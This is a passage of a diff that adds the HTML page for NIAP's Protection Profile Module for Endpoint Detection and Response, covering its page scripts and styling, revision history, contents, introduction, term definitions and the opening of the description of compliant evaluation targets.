@@ -1,0 +1,1586 @@
+<html><head><title>PP-Module for Endpoint Detection and Response (EDR)</title><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script><script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+            extensions: ["tex2jax.js"],
+            jax: ["input/TeX", "output/HTML-CSS"],
+            showMathMenu: false,
+            tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+              displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+              processEscapes: true
+            },
+            styles: {
+
+                ".MathJax_Display": {
+                "text-align": "left !important",
+                margin:       "0em 0em !important"
+            }}
+            });
+        </script><script type="text/javascript">// 
+
+// Called on page load to parse URL parameters and perform actions on them.
+function init(){
+    if(getQueryVariable("expand") == "on"){
+      expand();
+    }
+    fixAbbrs();
+}
+
+
+function fixAbbrs(){
+    var aa;
+    var brk_els = document.getElementsByClassName("dyn-abbr");
+    //
+    for(aa=0; aa!=brk_els.length; aa++){
+        var abbr = brk_els[aa].firstElementChild.getAttribute("href").substring(1);
+        var el = document.getElementById("long_"+abbr)
+        if (el==null) {
+             console.log("Could not find 'long_abbr_'"+abbr);
+             continue;
+        }
+        var abbr_def = el.textContent;
+        brk_els[aa].setAttribute("title", abbr_def);
+    }
+}
+
+
+
+// // 
+const AMPERSAND=String.fromCharCode(38);
+
+// Pass a URL variable to this function and it will return its value
+function getQueryVariable(variable)
+{
+    var query = window.location.search.substring(1);
+    var vars = query.split(AMPERSAND);
+    for (var i=0;i!=vars.length;i++) {
+        var pair = vars[i].split("=");
+        if(pair[0] == variable){return pair[1];}
+    }
+    return(false);
+}
+
+
+//    Expands all evaluation activities
+function expand(){
+    var ap = document.getElementsByClassName('activity_pane');
+    for (var ii = 0; ii!=ap.length; ii++) {
+        ap[ii].classList.remove('hide');
+    }
+}
+
+// Function to expand and contract a given div
+function toggle(descendent) {
+    var cl = descendent.parentNode.parentNode.classList;
+    if (cl.contains('hide')){
+      cl.remove('hide');
+    }
+    else{
+      cl.add('hide');
+    }
+}
+
+// Expands targets if they are hidden
+function showTarget(id){
+    var element = document.getElementById(id);
+    while (element != document.body.rootNode ){
+	element.classList.remove("hide");
+	element = element.parentElement;
+    }
+}
+
+
+// </script><style type="text/css">
+    #toc a{
+        display: block;
+    }
+
+    svg{
+      width: 100%;
+    }
+
+    a[id^="ajq_"]{
+        color:black;
+    }
+
+    
+    body{
+       max-width: 900px;
+       margin: auto;
+    }
+    #toc span{
+       margin-left: 20px;
+    }
+    .assignable-content{
+      font-style: italic;
+    }
+    .refinement{
+      font-weight: bold;
+    }
+    div.eacategory{
+      font-style: italic;
+      font-weight: bold;
+    }
+    .activity_pane .toggler::after, .activity_pane .toggler{
+       display: inline-block;
+       height: auto;
+       content: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8A\
+       AAAPCAYAAAA71pVKAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAQOFAAEDhQGl\
+       VDz+AAAAB3RJTUUH4gIXFDM7fhmr1wAAAfRJREFUKM+dkk9I02EYxz/P+25uurWR\
+       tTkzI4NGl4jQgkq71K1DhnTQIDolRAQFQYSHTtGhU4e6eujQofBSFLOg0C4RUSjh\
+       FnmqTTdKpj/mfv/eX4cUpmRYn9vz8v3w8D7PA/AWGADCbI4QcAb4AnAF8IBJEdX+\
+       N0tEda40C4AHADviW1LFvpOX6+FwtAacVzqkGiWtwxo4F21OuPu7+yvxRNoDEhpY\
+       cpzavkQyc7D76FCk+vN7j7VU6RdR4xAsikjGGP9FKrN3sPfEpajv2i2zhckR4JUG\
+       UCr0erFavLkn2ytd2WPxcFOsZb74+SIQA0YPHBqIdB8Z6tChJv1m/N4P33OGAUsD\
+       BIFxPNcOkq07jyeSbbo1tTu2q6vHEqU7D/ddSKcz2ZQJjBSmx925b9NjwEMAafha\
+       eyQa/3Dq7O0243sCIEoRGAOA59nm5dM7OHVruzH+AkDjYEp23RrLT+U8Ub+fV0UR\
+       oVyaMfVa9fqquF5GKX3ja2FCuc6yWbMipYNP755UgEdr8o2FMf5ivVYdKRfzRkRW\
+       RfJTOc+2rWdAcUN5hdGP7x8viGgAXLvGbGFCKxW6tj74J3nOqVvP89M5V6kQ86UZ\
+       f7lWvWWMt7Sp41VKb21uSfqnB++6kWi8BLTzL4ioq7H4tgC4z3/QAZSBxEaBXygN\
+       v+jeFnAPAAAAAElFTkSuQmCC');
+       max-width: 15px;
+    }
+
+
+    a {
+      text-decoration: none;
+      word-wrap: break-word;
+    }
+    a.abbr:link{
+      color:black;
+      text-decoration:none;
+    }
+    a.abbr:visited{
+      color:black;
+      text-decoration:none;
+    }
+    a.abbr:hover{
+      color:blue;
+      text-decoration:none;
+    }
+    a.abbr:hover:visited{
+      color:purple;
+      text-decoration:none;
+    }
+    a.abbr:active{
+      color:red;
+      text-decoration:none;
+    }
+    .note-header{
+      font-weight: bold;
+    }
+    .note p:first-child{
+      display: inline;
+    }
+
+
+    /* Tooltip container */
+    .tooltipped {
+       position: relative;
+       display: inline-block;
+       border-bottom: 1px dotted black; /* If you want dots under the hoverable text */
+    }
+
+    /* Tooltip text */
+    .tooltiptext {
+       visibility: hidden;
+       width: 120px;
+       background-color: black;
+       color: #fff;
+       text-align: center;
+       padding: 5px 0;
+       border-radius: 6px;
+
+       /* Position the tooltip text - see examples below! */
+       position: absolute;
+       z-index: 1;
+   }
+
+   /* Show the tooltip text when you mouse over the tooltip container */
+   .tooltipped:hover .tooltiptext {
+       visibility: visible;
+   }
+   tr.major-row{
+       border-top-style: double;
+   }
+   tr.major-row td:first-child{
+       border-right-style: ridge;
+       background-color: white;
+   } 
+   table.mfs td{
+       text-align: center;
+   }
+   table.mfs td:first-child{
+       text-align: left;
+   }
+   table{
+       margin:auto;
+       margin-top:1em;
+       border-collapse:collapse; /*border: 1px solid black;*/
+   }
+   td{
+       text-align:left;
+       padding:8px 8px;
+   }
+   th{
+       padding:8px 8px;
+   }
+   thead tr td{
+       text-align: center;
+       font-style: oblique;
+       font-weight: bold;
+   }
+   tr.header{
+       border-bottom:3px solid gray;
+       padding:8px 8px;
+       text-align:left;
+       font-weight:bold; /*font-size: 90%; font-family: verdana, arial, helvetica, sans-serif; */
+   }
+   table tr:nth-child(2n+2){
+       background-color:#F4F4F4;
+   }
+
+   .dependent{
+       border: 1px solid gray;
+       border-radius: 1px
+   }
+   .dependent-content{
+       margin-left: 25px;
+       font-style: italic;
+   }
+   
+
+
+          .figure{
+              font-weight:bold;
+          }
+          h1{
+              page-break-before:always;
+              text-align:left;
+              font-size:200%;
+              margin-top:2em;
+              margin-bottom:2em;
+              font-family:verdana, arial, helvetica, sans-serif;
+              margin-bottom:1.0em;
+          }
+          h1.title{
+              text-align:center;
+          }
+          h2{
+              font-size:125%;
+              border-bottom:solid 1px gray;
+              margin-bottom:1.0em;
+              margin-top:2em;
+              margin-bottom:0.75em;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+          h3{
+              font-size:110%;
+              margin-bottom:0.25em;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+          h4{
+              margin-left:0%;
+              font-size:100%;
+              margin-bottom:0.75em;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+          h5,
+          h6{
+              margin-left:6%;
+              font-size:90%;
+              margin-bottom:0.5em;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+          p{
+              margin-bottom:0.6em;
+              margin-top:0.2em;
+          }
+          pre{
+              margin-bottom:0.5em;
+              margin-top:0.25em;
+              margin-left:3%;
+              font-family:monospace;
+              font-size:90%;
+          }
+          ul{
+              margin-bottom:0.5em;
+              margin-top:0.25em;
+          }
+          td{
+              vertical-align:top;
+          }
+          dl{
+              margin-bottom:0.5em;
+              margin-top:0.25em;
+          }
+          dt{
+              margin-top:0.7em;
+              font-weight:bold;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+
+          a.linkref{
+              font-family:verdana, arial, helvetica, sans-serif;
+              font-size:90%;
+          }
+
+          *.simpleText{
+              margin-left:10%;
+          }
+          *.propertyText{
+              margin-left:10%;
+              margin-top:0.2em;
+              margin-bottom:0.2em
+          }
+          *.toc{
+              background:#FFFFFF;
+          }
+          *.toc2{
+              background:#FFFFFF;
+          }
+          div.comp{
+              margin-left:8%;
+              margin-top:1em;
+              margin-bottom:1em;
+          }
+          div.element{
+              margin-bottom:1em;
+          }
+          div.appnote{
+              margin-left:0%;
+              margin-top:1em;
+          }
+          .comment-aa{
+              background-color:beige;
+              color:green;
+          }
+          div.subaact{
+              margin-left:0%;
+              margin-top:1em;
+          }
+          div.activity_pane_body{
+              margin-left:0%;
+              margin-top:1em;
+              margin-bottom:1em;
+              padding:1em;
+              border:2px solid #888888;
+              border-radius:3px;
+              display:block;
+              margin-left:0%;
+              margin-top:1em;
+              margin-bottom:1em;
+              box-shadow:0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.2),0 1px 5px 0 rgba(0,0,0,.12);
+          }
+          div.optional-appendicies{
+              display:none;
+          }
+
+          div.statustag{
+              margin-left:0%;
+              margin-top:1em;
+              margin-bottom:1em;
+              padding: 0.6em;
+              border:2px solid #888888;
+              border-radius:3px;
+          }
+
+          div.toc{
+              margin-left:8%;
+              margin-bottom:4em;
+              padding-bottom:0.75em;
+              padding-top:1em;
+              padding-left:2em;
+              padding-right:2em;
+          }
+          span.SOlist{
+              font-size:90%;
+              font-family:verdana, arial, helvetica, sans-serif;
+          }
+          h2.toc{
+              border-bottom:none;
+              margin-left:0%;
+              margin-top:0em;
+          }
+          p.toc{
+              margin-left:2em;
+              margin-bottom:0.2em;
+              margin-top:0.5em;
+          }
+          p.toc2{
+              margin-left:5em;
+              margin-bottom:0.1em;
+              margin-top:0.1em;
+          }
+          div.center{
+              display:block;
+              margin-left:auto;
+              margin-right:auto;
+              text-align:center;
+          }
+          div.figure{
+              display:block;
+              margin-left:auto;
+              margin-right:auto;
+              text-align:center;
+              margin-top:1em;
+          }
+          div.activity_pane_header{
+              display:table-cell;
+              vertical-align:middle;
+              padding-top:10px
+          }
+          span.activity_pane_label{
+              vertical-align:middle;
+              color:black;
+              text-decoration:none;
+              font-size:100%;
+              font-weight:bold; /*font-family: verdana, arial, helvetica, sans-serif; */
+          }
+          .dyn-abbr a, .dyn-abbr a:active, .dyn-abbr a:visited{
+              background-color: inherit;
+              color: inherit;
+              text-decoration: inherit;;
+          }
+
+          @media screen{
+              *.reqid{
+                  float:left;
+                  font-size:90%;
+                  font-family:verdana, arial, helvetica, sans-serif;
+                  margin-right:1em;
+              }
+              *.req{
+                  margin-left:0%;
+                  margin-top:1em;
+                  margin-bottom:1em;
+              }
+              *.reqdesc{
+                  margin-left:20%;
+              }
+
+              .activity_pane.hide .toggler::after, .activity_pane.hide .toggler{
+	          content: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8A\
+		  AAAPCAYAAAA71pVKAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAQOFAAEDhQGl\
+		  VDz+AAAAB3RJTUUH4gIXFC4BR3keeQAAAfZJREFUKM+d0k1PE1EUBuB37h2nQ+30\
+		  w5YObR0FhIppqBgWuDCaSBQjiQZNTIxLfoAkBHXh2vg7xID+ABPXBl3UdAMaN1CR\
+		  j5ZijZ22DKW9d44LP1KMROvZnMU5z+KcvBzAAgADwCdV1RzXlYQ26tYhrYM6u/qX\
+		  ATwCcKodrAOYv3z9IV28OuP6/NHPAGYZ45G/QQ5AAFjNbyzdTA2NewcGx7xeI5wu\
+		  FZenQOQQuasHncN/9IJo1sn+unkpbqVFIJhgydQo13VjDKCJSnnLBJAHUPoTBoA3\
+		  uzvlfiNgDhn+KMiVCB6xYCZSoaPHz5wrba/cbuztpBWFvQLI+R2DSGZqleKNuJX2\
+		  cVVjAIExDo/uV7pPjGhSNntrleI9+n7Ox33Y549Wq/ZWTyh8rNcfjPlaZ4xzZvUM\
+		  ezrNvnJ+fXFCiL2k2rpQq2wnAqH4tYjZFyZq/Y8CKZoim51z1nIZQ4jGNIC5fZhz\
+		  7fHA4JVuj26AyIWiMDSbdTi1L/T29RO7ahdfKgqbInJLANCKZ6Kx5J24dVowztW6\
+		  Y+8WNt91FNYXc4WN988BzAL4QOT+Aj/x8GFf+MHI+UlI2cBS9kVlLZfxSFdMS9GY\
+		  V1WtKETDPShhz85emLRHx++TETBLAJ4qCov8c7ajsZMr/5PtBQB3AXSpqsbagd8A\
+		  O+HMRUtPNsQAAAAASUVORK5CYII=');
+              }
+
+              .activity_pane.hide .activity_pane_body{
+                  display:none;
+              }
+              div.statustag{
+                  box-shadow:4px 4px 3px #888888;
+              }
+          }
+
+
+          @media print{
+              *.reqid{
+                  font-size:90%;
+                  font-family:verdana, arial, helvetica, sans-serif;
+              }
+              *.req{
+                  margin-left:0%;
+                  margin-top:1em;
+                  margin-bottom:1em;
+              }
+              *.reqdesc{
+                  margin-left:20%;
+              }
+              div.activity_pane_body{
+                  padding:1em;
+                  border:2px solid #888888;
+                  border-radius:3px;
+                  display:block;
+              }
+
+	            img[src="images/collapsed.png"] { display:none;}
+
+          }
+	</style></head><body onLoad="init()"><h1 class="title" style="page-break-before:auto;">PP-Module for Endpoint Detection and Response (EDR)</h1><noscript><h1 style="text-align:center; border-style: dashed; border-width: medium; border-color: red;">This page is best viewed with JavaScript enabled!</h1></noscript><div class="center"><img alt="NIAP Logo" src="images/niaplogo.png"><br><p></p>Version: 1.0<p></p>2020-10-23<p></p><b>National Information Assurance Partnership</b></div><h2 style="page-break-before:always;">Revision History</h2><table><tr class="header"><th>Version</th><th>Date</th><th>Comment</th></tr><tr><td>1.0</td><td>2020-10-23</td><td>First version released</td></tr></table><h2>Contents</h2><div class="toc" id="toc"><a href="#int" style="text-indent:0px">1<span>Introduction</span></a><a href="#ppoverview" style="text-indent:10px">1.1<span>Overview</span></a><a href="#glossary" style="text-indent:10px">1.2<span>Terms</span></a><a href="#cc-terms" style="text-indent:20px">1.2.1<span>Common Criteria Terms</span></a><a href="#tech-terms" style="text-indent:20px">1.2.2<span>Technical Terms</span></a><a href="#TOEdescription" style="text-indent:10px">1.3<span>Compliant Targets of Evaluation</span></a><a href="#TOEboundary" style="text-indent:20px">1.3.1<span>TOE Boundary</span></a><a href="#TOEplatform" style="text-indent:20px">1.3.2<span>TOE Platform</span></a><a href="#usecases" style="text-indent:10px">1.4<span>Use Cases</span></a><a href="#conf" style="text-indent:0px">2<span>Conformance Claims</span></a><a href="#spd" style="text-indent:0px">3<span>Security Problem Description</span></a><a href="#threats" style="text-indent:10px">3.1<span>Threats</span></a><a href="#Assumptions" style="text-indent:10px">3.2<span>Assumptions</span></a><a href="#OSPs" style="text-indent:10px">3.3<span>Organizational Security Policies</span></a><a href="#obj" style="text-indent:0px">4<span>Security Objectives</span></a><a href="#SecurityObjectivesTOE" style="text-indent:10px">4.1<span>Security Objectives for the TOE</span></a><a href="#SecurityObjectivesTOEorEnvironment" style="text-indent:10px">4.2<span>Security Objectives for the Operational Environment</span></a><a href="#secconrat" style="text-indent:10px">4.3<span>Security Objectives Rationale</span></a><a href="#req" style="text-indent:0px">5<span>Security Requirements</span></a><a href="#App" style="text-indent:10px">5.1<span>App PP
+       Security Functional Requirements Direction
+    </span></a><a href="#modsfr-App" style="text-indent:20px">5.1.1<span>
+      Modified SFRs
+    </span></a><a href="#man-sfrs" style="text-indent:10px">5.2<span>TOE Security Functional Requirements</span></a><a href="#fau" style="text-indent:20px">5.2.1<span>Security Audit (FAU)</span></a><a href="#fia" style="text-indent:20px">5.2.2<span>Identification and Authentication (FIA)</span></a><a href="#fmt" style="text-indent:20px">5.2.3<span>Security Management (FMT)</span></a><a href="#fpt" style="text-indent:20px">5.2.4<span>Protection of the TSF (FPT)</span></a><a href="#ftp" style="text-indent:20px">5.2.5<span>Trusted Path/Channels (FTP)</span></a><a href="#obj-req-map" style="text-indent:10px">5.3<span>TOE Security Functional Requirements Rationale</span></a><a href="#mod-conrat" style="text-indent:0px">6<span>Consistency Rationale</span></a><a href="#conrat-App" style="text-indent:10px">6.1<span>
+    Protection Profile for Application Software</span></a><a href="#contoe-App" style="text-indent:20px">6.1.1<span>
+	Consistency of TOE Type
+      </span></a><a href="#consecprob-App" style="text-indent:20px">6.1.2<span>
+	Consistency of Security Problem Definition
+      </span></a><a href="#conobj-App" style="text-indent:20px">6.1.3<span>
+	Consistency of Objectives
+      </span></a><a href="#conreq-App" style="text-indent:20px">6.1.4<span>
+	Consistency of Requirements
+      </span></a><a href="#opt-sfrs" style="text-indent:0px">Appendix A - <span>Optional SFRs</span></a><a href="#sel-sfrs" style="text-indent:0px">Appendix B - <span>Selection-based SFRs</span></a><a href="#obj-sfrs" style="text-indent:0px">Appendix C - <span>Objective SFRs</span></a><a href="#ext-comp-defs" style="text-indent:0px">Appendix D - <span>Extended Component Definitions</span></a><a href="#ext-comp-defs-bg" style="text-indent:10px">D.1<span>Background and Scope</span></a><a href="#ext-comp-defs-bg" style="text-indent:10px">D.2<span>Extended Component Definitions</span></a><a href="#satisfiedreqs" style="text-indent:0px">Appendix E - <span>Implicitly Satisfied Requirements</span></a><a href="#bibliography" style="text-indent:0px">Appendix F - <span>Bibliography</span></a><a href="#acronyms" style="text-indent:0px">Appendix G - <span>Acronyms</span></a></div><h1 class="indexable" data-level="1" id="int">1 Introduction</h1>
+    <h2 class="indexable" data-level="2" id="ppoverview">1.1 Overview</h2> 
+      The scope of this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> is to describe the security functionality of an Endpoint Detection and Response (<abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>) system in terms of [<a class="abbr" href="#abbr_CC"><abbr title="Common Criteria">CC</abbr></a>] 
+      and to define functional and assurance requirements for such products<a href="#period_0" id="period_0">. </a>This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> is intended for use with the following Base-PPs:
+      
+      <ul>
+        <li>Protection Profile for Application Software <a href="#bibAppPP">[AppPP]</a>, Version 1.3<a href="#period_1" id="period_1">. </a></li>
+      </ul>
+      
+      This <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> is valid because an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> is deployed as a software application on a general-purpose operating system<a href="#period_2" id="period_2">. </a>
+    
+    <h2 class="indexable" data-level="2" id="glossary">1.2 Terms</h2>
+The following sections list Common Criteria and technology terms used in this document<a href="#period_3" id="period_3">. </a>    <h3 class="indexable" data-level="3" id="cc-terms">1.2.1 Common Criteria Terms</h3><table><tr><td><div id="Assurance">Assurance</div></td><td>Grounds for confidence that a <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> meets the SFRs <a href="#bibCC">[CC]</a><a href="#period_4" id="period_4">. </a></td></tr><tr><td><div id="Base_Protection_Profile">Base Protection Profile (<abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>)</div></td><td>Protection Profile used as a basis to build a <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr><a href="#period_5" id="period_5">. </a></td></tr><tr><td><div id="Common_Criteria">Common Criteria (<abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr>)</div></td><td>Common Criteria for Information Technology Security Evaluation (International Standard ISO/IEC 15408)<a href="#period_6" id="period_6">. </a></td></tr><tr><td><div id="Common_Criteria_Testing_Laboratory">Common Criteria Testing Laboratory</div></td><td>
+      Within the context of the Common Criteria Evaluation and Validation Scheme (CCEVS), an <abbr class="dyn-abbr"><a href="#abbr_IT">IT</a></abbr> security evaluation facility, accredited by the National Voluntary Laboratory Accreditation Program (NVLAP) and approved by the NIAP Validation Body to conduct Common Criteria-based evaluations<a href="#period_7" id="period_7">. </a>    </td></tr><tr><td><div id="Common_Evaluation_Methodology">Common Evaluation Methodology (<abbr class="dyn-abbr"><a href="#abbr_CEM">CEM</a></abbr>)</div></td><td>Common Evaluation Methodology for Information Technology Security Evaluation<a href="#period_8" id="period_8">. </a></td></tr><tr><td><div id="Distributed_TOE">Distributed <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr></div></td><td>A <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> composed of multiple components operating as a logical whole<a href="#period_9" id="period_9">. </a></td></tr><tr><td><div id="Operational_Environment">Operational Environment (<abbr class="dyn-abbr"><a href="#abbr_OE">OE</a></abbr>)</div></td><td>Hardware and software that are outside the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> boundary that support the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> functionality and security policy<a href="#period_10" id="period_10">. </a></td></tr><tr><td><div id="Protection_Profile">Protection Profile (<abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr>)</div></td><td>An implementation-independent set of security requirements for a category of products<a href="#period_11" id="period_11">. </a></td></tr><tr><td><div id="Protection_Profile_Configuration">Protection Profile Configuration (<abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr>)</div></td><td>A comprehensive set of security requirements for a product type that consists of at least one <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> and at least one <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_12" id="period_12">. </a></td></tr><tr><td><div id="Protection_Profile_Module">Protection Profile Module (<abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>)</div></td><td>An implementation-independent statement of security needs for a <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> type complementary to one or more Base Protection Profiles<a href="#period_13" id="period_13">. </a></td></tr><tr><td><div id="Security_Assurance_Requirement">Security Assurance Requirement (<abbr class="dyn-abbr"><a href="#abbr_SAR">SAR</a></abbr>)</div></td><td>A requirement to assure the security of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_14" id="period_14">. </a></td></tr><tr><td><div id="Security_Functional_Requirement">Security Functional Requirement (<abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr>)</div></td><td>A requirement for security enforcement by the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_15" id="period_15">. </a></td></tr><tr><td><div id="Security_Target">Security Target (<abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr>)</div></td><td>A set of implementation-dependent security requirements for a specific product<a href="#period_16" id="period_16">. </a></td></tr><tr><td><div id="TOE_Security_Functionality"><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> Security Functionality (<abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr>)</div></td><td>The security functionality of the product under evaluation<a href="#period_17" id="period_17">. </a></td></tr><tr><td><div id="TOE_Summary_Specification"><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> Summary Specification (<abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr>)</div></td><td>A description of how a <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> satisfies the SFRs in an <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_18" id="period_18">. </a></td></tr><tr><td><div id="Target_of_Evaluation">Target of Evaluation (<abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>)</div></td><td>The product under evaluation<a href="#period_19" id="period_19">. </a></td></tr></table><h3 class="indexable" data-level="3" id="tech-terms">1.2.2 Technical Terms</h3><table><tr><td><div id="Alert">Alert</div></td><td>An event or notification on the management dashboard that highlights
+        potentially unauthorized activity<a href="#period_20" id="period_20">. </a>
+      </td></tr><tr><td><div id="Endpoint">Endpoint</div></td><td>A computing device that runs a general purpose <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr>, a mobile
+        device <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr>, or network device <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr><a href="#period_21" id="period_21">. </a>Endpoints can include desktops, servers, and mobile devices<a href="#period_22" id="period_22">. </a>      </td></tr><tr><td><div id="Endpoint_Detection_and_Response">Endpoint Detection and Response (<abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>)</div></td><td>Server software that analyzes collected <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> Host Agent data for detecting,
+        investigating, and remediating unauthorized activities on endpoints<a href="#period_23" id="period_23">. </a>The terms
+        <i><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr></i> and <i><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></i> are interchangeable in this
+        document<a href="#period_24" id="period_24">. </a>      </td></tr><tr><td><div id="Endpoint_Detection_and_Response_System">Endpoint Detection and Response System</div></td><td>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> server and the Host Agents they operate with<a href="#period_25" id="period_25">. </a>      </td></tr><tr><td><div id="Enroll">Enroll</div></td><td>The act of registering an HA endpoint with the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_26" id="period_26">. </a></td></tr><tr><td><div id="Host_Agent">Host Agent</div></td><td>Complementary software that executes on endpoints to collect data about the
+        endpoint and executes commands sent to the endpoint from an Enterprise Security Management
+        (ESM) server or service<a href="#period_27" id="period_27">. </a>An example command sent to an endpoint could be to enforce a
+        policy from an ESM, to collect some files, or to run an <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr> command<a href="#period_28" id="period_28">. </a>
+      </td></tr><tr><td><div id="Management_Dashboard">Management Dashboard</div></td><td>A management interface for the configuration of <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> policy, visualization
+        of collected endpoint alert data, and issuing of remediation commands<a href="#period_29" id="period_29">. </a>      </td></tr><tr><td><div id="Potentially_Unauthorized_Activity">Potentially Unauthorized Activity</div></td><td>This refers to the set of activities detected by the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>, specific items detected may be unique to the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr></td></tr><tr><td><div id="SOC_Analyst">SOC Analyst</div></td><td>Security Operations Center (SOC) Analyst is typically the person
+        responsible for reviewing potentially unauthorized activities via alerts and
+        performing remediation and clean up<a href="#period_30" id="period_30">. </a>      </td></tr></table>
+
+    <h2 class="indexable" data-level="2" id="TOEdescription">1.3 Compliant Targets of Evaluation</h2>
+   An <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> is
+      enterprise management software that collects endpoint host data to detect potentially
+      unauthorized activity on endpoints and to enable threat hunting and other incident response
+      actions to remediate malicious behaviors<a href="#period_31" id="period_31">. </a>These requirements cover basic security characteristics 
+      and behaviors for <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> products; the platform on which the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> runs may be a physical or virtual 
+      Operating System (<abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr>), and on-premises or in a cloud environment<a href="#period_32" id="period_32">. </a><br>
+      
+      <br> <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> products rely on additional software running on the endpoint, called the Host
+      Agent, to communicate commands or policy changes and to receive endpoint host data<a href="#period_33" id="period_33">. </a>Security
+      requirements for the Host Agent are addressed in the separate <a href="#bibHAGT">[Host Agent]</a>
+      <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_34" id="period_34">. </a>Evaluation of an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> system will require evaluations of different system components 
+      consisting of <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and <a href="#bibHAGT">[Host Agent]</a><a href="#period_35" id="period_35">. </a>Each evaluation must satisfy the requirements 
+      in both the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and HA in addition to its <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> Application Software<a href="#period_36" id="period_36">. </a>      
+      
+      Evaluation of an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> system will require evaluation of different system components consisting of one <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> 
+      and at least one Host Agent<a href="#period_37" id="period_37">. </a>Therefore, the evaluation must claim conformance to a <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr> that 
+      includes the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> for Endpoint Detection and Response (<abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>) and the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> for Host Agent<a href="#period_38" id="period_38">. </a><br>
+      <br> There are two primary architectural categories addressed by requirements in this
+      <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>, as seen in Figure 1<a href="#period_39" id="period_39">. </a>      <ul>
+        <li>Endpoints communicate over the Internet to an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> hosted by a cloud service provider (Software as a Service)<a href="#period_40" id="period_40">. </a></li>
+        <li>Endpoints communicate with an on-premises <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> in a hub and spoke network model<a href="#period_41" id="period_41">. </a></li>
+      </ul>
+      <div class="figure" id="figure-toe_arch"><img height="" id="toe_arch" src="images/edr_archi.png" width=""><p></p><span class="ctr" data-counter-type="ct-figure" data-myid="figure-toe_arch">Figure <span class="counter">1</span></span>:
